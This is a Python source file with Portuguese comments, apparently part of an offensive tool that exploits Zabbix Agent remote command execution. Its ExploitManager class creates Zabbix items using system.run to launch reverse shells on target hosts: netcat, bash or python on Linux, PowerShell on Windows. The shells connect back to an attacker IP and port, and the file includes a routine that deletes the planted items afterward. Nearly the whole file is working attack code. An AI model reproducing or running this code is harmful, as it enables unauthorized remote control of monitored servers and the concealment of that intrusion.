"""
Módulo principal de exploits
Gerencia a criação e execução de exploits para diferentes sistemas operacionais
"""

import logging
from typing import Dict, Optional, List
from .zabbix_api_client import ZabbixAPIClient
from .payload_generator import PayloadGenerator
from .os_detector import OSDetector


class ExploitManager:
    """Gerenciador de exploits para Zabbix Agent RCE"""
    
    def __init__(self, api_client: ZabbixAPIClient, payload_generator: PayloadGenerator):
        self.api_client = api_client
        self.payload_generator = payload_generator
        self.os_detector = OSDetector()
        self.logger = logging.getLogger('zabbix_rce.exploit')
    
    def deploy_linux_exploit(self, hostid: str, interfaceid: str, ip_shell: str, 
                           port: int, method: str = 'netcat') -> bool:
        """
        Implanta exploit para sistemas Linux
        
        Args:
            hostid: ID do host alvo
            interfaceid: ID da interface
            ip_shell: IP do atacante
            port: Porta para conexão reversa
            method: Método de exploit ('netcat', 'bash', 'python')
            
        Returns:
            bool: True se o exploit foi implantado com sucesso
        """
        self.logger.info(f"Implantando exploit Linux via {method}")
        
        try:
            # Gera payload
            payload_data = self.payload_generator.generate_linux_payload(method, ip_shell, port)
            
            # Limpa itens existentes
            item_name = f"linux_reverse_shell_{method}"
            self.api_client.cleanup_existing_items(hostid, item_name)
            
            # Usa o comando gerado pelo payload
            command = payload_data['command']
            
            # Cria item no Zabbix
            key = f'system.run[{command},nowait]'
            
            item_id = self.api_client.create_item(
                hostid=hostid,
                interfaceid=interfaceid,
                name=item_name,
                key=key,
                item_type=0,  # Zabbix agent
                value_type=3,  # Log
                delay="60s"
            )
            
            if item_id:
                self.logger.info(f"Exploit Linux implantado com sucesso. Item ID: {item_id}")
                return True
            else:
                self.logger.error("Falha ao implantar exploit Linux")
                return False
                
        except Exception as e:
            self.logger.error(f"Erro ao implantar exploit Linux: {e}")
            return False
    
    def deploy_windows_exploit(self, hostid: str, interfaceid: str, ip_shell: str, 
                             port: int, method: str = 'powershell') -> bool:
        """
        Implanta exploit para sistemas Windows
        
        Args:
            hostid: ID do host alvo
            interfaceid: ID da interface
            ip_shell: IP do atacante
            port: Porta para conexão reversa
            method: Método de exploit ('powershell')
            
        Returns:
            bool: True se o exploit foi implantado com sucesso
        """
        self.logger.info(f"Implantando exploit Windows via {method}")
        
        try:
            # Gera payload
            payload_data = self.payload_generator.generate_windows_payload(method, ip_shell, port)
            
            # Limpa itens existentes
            item_name = f"windows_reverse_shell_{method}"
            self.api_client.cleanup_existing_items(hostid, item_name)
            
            # Usa o comando gerado pelo payload
            command = payload_data['command']
            
            # Cria item no Zabbix
            key = f'system.run[{command},nowait]'
            
            item_id = self.api_client.create_item(
                hostid=hostid,
                interfaceid=interfaceid,
                name=item_name,
                key=key,
                item_type=0,  # Zabbix agent
                value_type=3,  # Log
                delay="60s"
            )
            
            if item_id:
                self.logger.info(f"Exploit Windows implantado com sucesso. Item ID: {item_id}")
                return True
            else:
                self.logger.error("Falha ao implantar exploit Windows")
                return False
                
        except Exception as e:
            self.logger.error(f"Erro ao implantar exploit Windows: {e}")
            return False
    
    def cleanup_exploits(self, hostid: str) -> bool:
        """
        Remove todos os exploits implantados em um host
        
        Args:
            hostid: ID do host
            
        Returns:
            bool: True se a limpeza foi bem-sucedida
        """
        self.logger.info(f"Iniciando limpeza de exploits no host {hostid}")
        
        cleanup_success = True
        
        # Define nomes de itens a serem removidos
        item_patterns = [
            'linux_reverse_shell_',
            'windows_reverse_shell_',
            'nc_reverse_shell',
            'powershell_reverse_shell'
        ]
        
        # Remove itens para cada padrão
        for pattern in item_patterns:
            try:
                items = self.api_client.get_items_by_name(hostid, pattern)
                if items:
                    item_ids = [item['itemid'] for item in items]
                    if not self.api_client.delete_items(item_ids):
                        cleanup_success = False
            except Exception as e:
                self.logger.error(f"Erro durante limpeza de {pattern}: {e}")
                cleanup_success = False
        
        if cleanup_success:
            self.logger.info("Limpeza de exploits concluída com sucesso")
        else:
            self.logger.warning("Limpeza de exploits concluída com alguns erros")
        
        return cleanup_success
